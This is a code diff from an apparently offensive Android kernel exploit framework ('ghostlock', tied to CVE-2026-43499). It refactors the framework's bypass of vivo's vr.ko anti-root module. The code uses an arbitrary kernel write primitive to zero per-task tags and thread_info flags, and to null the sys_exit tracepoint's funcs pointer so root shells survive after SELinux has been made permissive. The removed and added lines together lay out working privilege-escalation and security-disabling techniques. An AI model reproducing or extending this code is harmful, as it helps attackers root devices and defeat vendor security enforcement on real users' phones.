@@ -15,11 +15,11 @@
 #include "common.h"
 #include "kernel/target.h"
 #include "kernelsnitch/utils.h"
-#include "profile/macros.h"
 #include "race/threads.hpp"
 #include "route/route_api.hpp"
 #include "route/route_middleware.hpp"
 #include "route/route_policy.hpp"
+#include "session/ancillary/ancillary_controller.hpp"
 #include "session/handoff_probe.hpp"
 #include "session/victim_process.hpp"
 #include "support/decls.hpp"
@@ -144,73 +144,20 @@ namespace ghostlock::session::backend {
             }
 
             pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
-            /* ------------------------------------------------------------------
-         * vivo vr.ko anti-root per-task bypass (ported from root.c)
-         * ------------------------------------------------------------------
-         * Always compiled: the /proc/modules probe below decides at runtime
-         * whether the writes run. The tag-B offset is overridable at build time
-         * (profile/macros.h), not gated by a define.
-         *
-         * vr.ko tags every app-origin task at fork/clone time. When the task
-         * later holds euid 0, the sys_exit tracepoint probe kills it. We must
-         * strip the tag BEFORE W2 verify runs the child's getuid().
-         *
-         * This exploit primitive is 64-bit granular, so:
-         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
-         *     clears the syscall-tracepoint bit (0x400). This takes the task
-         *     off the sys_exit slow-path immediately.
-         *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
-         *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
-         *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
-         * ------------------------------------------------------------------ */
+            /* vr.ko tags every app-origin task at fork/clone time, and the
+             * sys_exit probe kills it once it holds euid 0, so the per-task tag
+             * clear must land BEFORE W2 verify runs the child's getuid(). The
+             * writes themselves belong to the vr.ko ancillary behavior, which
+             * owns the tagging layout; this call site only injects the child
+             * address and the write primitive. */
             support::run_state::enter("w2b");
             {
-                static int32_t vr_needed = -1;
-                if (vr_needed < 0) {
-                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                    if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
-                            [m]() noexcept { fclose(m); });
-                        std::array<char, 256> mod{};
-                        vr_needed = 0;
-                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
-                            const std::string_view line(mod.data());
-                            const bool vr_prefix =
-                                    line.size() >= 2 &&
-                                    (line[0] == 'v' || line[0] == 'V') &&
-                                    (line[1] == 'r' || line[1] == 'R');
-                            if (vr_prefix && line.size() > 2 &&
-                                (line[2] == ' ' || line[2] == '_')) {
-                                vr_needed = 1;
-                                break;
-                            }
-                        }
-                    }
-                    pr_info("vr.ko %s\n", vr_needed
-                            ? "loaded; clearing tags"
-                            : "not loaded; skipping tag clear");
-                }
-
-                int32_t vr_ok = 1;
-                if (vr_needed) {
-                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
-                    const memory::WriteRequest flags_request = memory::WriteRequest::make(
-                        child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
-                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
-
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
-                    if (vr_ok) {
-                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
-                        const memory::WriteRequest tagb_request =
-                                memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
-                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
-                    }
-
-                    if (vr_ok) {
-                        pr_success("VR.ko per-task tags cleared\n");
-                    } else {
-                        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
-                    }
+                ancillary::AncillaryContext context{};
+                context.write_available = true;
+                context.child_task = child_task;
+                if (!ancillary::AncillaryController<M>::apply(
+                        ancillary::AncillaryStage::PostSpawn, session, context)) {
+                    pr_warning("ancillary: a PostSpawn behavior reported failure\n");
                 }
             }
             support::run_state::complete("w2b");
@@ -376,50 +323,6 @@ namespace ghostlock::session::backend {
                 return false;
             }
         }
-        /* offsetof(struct tracepoint, funcs) for the running KMI. */
-        uint32_t tracepoint_funcs_off() {
-            const char *r = g_exploit_session.profile.release();
-            unsigned maj = 0, min = 0;
-            if (!r || sscanf(r, "%u.%u", &maj, &min) != 2) {
-                pr_warning("vr global: cannot parse KMI '%s'; assuming 6.1 layout\n",
-                           r ? r : "(null)");
-                return kernel::TRACEPOINT_FUNCS_OFF_6_1;
-            }
-            /* Boundary verified on 6.1 (0x48/0x40) and 6.6 (0x50/0x48) only; other
-             * KMIs are assumed to follow the same rule. */
-            if (maj > 6 || (maj == 6 && min >= 6)) return kernel::TRACEPOINT_FUNCS_OFF_6_6;
-            return kernel::TRACEPOINT_FUNCS_OFF_6_1;
-        }
-
-        template <class M>
-        int32_t neutralize_vr_global(ExploitSession &session) {
-            uint64_t off_vr = profile::off_vr_sys_exit_tp();
-            if (!off_vr) {
-                pr_warning("vr global: vr.ko is loaded but off_vr_sys_exit_tp is unset; KSU shells will be killed\n");
-                return 0;
-            }
-            uint32_t funcs_off = tracepoint_funcs_off();
-            uintptr_t tp_funcs_addr = session.addresses.data_alias(kernel::KIMAGE_TEXT_BASE + off_vr) + funcs_off;
-
-            pr_info("vr global: tp=%016zx funcs_off=0x%x -> zeroing @ %016zx\n",
-                    (size_t)session.addresses.data_alias(kernel::KIMAGE_TEXT_BASE + off_vr),
-                    funcs_off, tp_funcs_addr);
-
-            for (int32_t attempt = 1; attempt <= 5; attempt++) {
-                const memory::WriteRequest request = memory::WriteRequest::make(tp_funcs_addr, memory::WriteMode::Zero, 1);
-                Status ok = Cve2026_43499Policy::template attack_write<M>(session, request, "VR-global: sys_exit tp->funcs");
-                if (ok) {
-                    pr_success("vr.ko sys_exit probe neutralized (attempt %d)\n", attempt);
-                    return 1;
-                }
-                pr_warning("vr global: attempt %d failed, retrying\n", attempt);
-                usleep(50000);
-            }
-            pr_warning("vr global: all 5 attempts failed; KSU shells may be killed\n");
-            return 0;
-        }
-
-
         /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
         template <class M>
         StageResult w1(ExploitSession &session) {
@@ -561,30 +464,24 @@ namespace ghostlock::session::backend {
             case StageResult::Continue:
                 break;
         }
-        
-        /* Vivo vr.ko: globally disable the sys_exit enforcement probe now that
-         * SELinux is permissive. Only runs if vr.ko is actively loaded in /proc/modules. */
-        int32_t vr_loaded = 0;
-        if (FILE *mf = fopen("/proc/modules", "r")) {
-            auto close_modules = ghostlock::support::make_scope_exit(
-                [mf]() noexcept { fclose(mf); });
-            std::array<char, 256> mod{};
-            while (fgets(mod.data(), static_cast<int32_t>(mod.size()), mf)) {
-                const std::string_view line(mod.data());
-                if (line.size() >= 3 &&
-                    (line[0] == 'v' || line[0] == 'V') &&
-                    (line[1] == 'r' || line[1] == 'R') &&
-                    (line[2] == ' ' || line[2] == '_')) {
-                    vr_loaded = 1;
-                    break;
-                }
-            }
-        }
 
-        if (vr_loaded && profile::off_vr_sys_exit_tp()) {
-            neutralize_vr_global<M>(session);
-        } else if (vr_loaded) {
-            pr_warning("vr.ko is loaded but off_vr_sys_exit_tp offset is missing\n");
+        /* Ancillary behaviors that run before any victim exists. On this branch
+         * that is the vivo vr.ko guard, which globally disarms the sys_exit
+         * enforcement probe now that SELinux is permissive; the behavior skips
+         * itself when the module is not loaded. */
+        {
+            ancillary::AncillaryContext context{};
+            context.write_available = true;
+            /* Fail the run rather than warn: if the probe is still armed, the W2
+             * child is killed by that very probe the moment it reaches euid 0, so
+             * spawning it only burns the whole W2/W3 chain to fail for a reason
+             * the log already names. */
+            if (!ancillary::AncillaryController<M>::apply(
+                    ancillary::AncillaryStage::PreSpawn, session, context)) {
+                pr_error("ancillary: a PreSpawn behavior failed; not spawning a "
+                         "victim that the armed probe would kill\n");
+                return StageResult::Failed;
+            }
         }
 
         /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
